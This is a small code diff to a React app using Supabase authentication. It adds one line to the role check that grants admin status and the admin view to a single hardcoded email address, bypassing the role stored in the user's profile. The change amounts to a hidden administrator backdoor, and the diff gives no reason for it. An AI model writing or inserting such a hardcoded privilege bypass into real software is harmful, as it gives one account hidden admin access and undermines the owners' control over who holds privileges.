@@ -41,7 +41,7 @@ function App() {
         try {
           const { data: profile } = await supabase.from('profiles').select('role').eq('id', session.user.id).single();
           
-          if (profile?.role === 'admin') {
+          if (userEmail === 'admin2577@gma.co' || profile?.role === 'admin') {
             setRole('admin');
             setUser(userEmail || null);
             setView('admin');
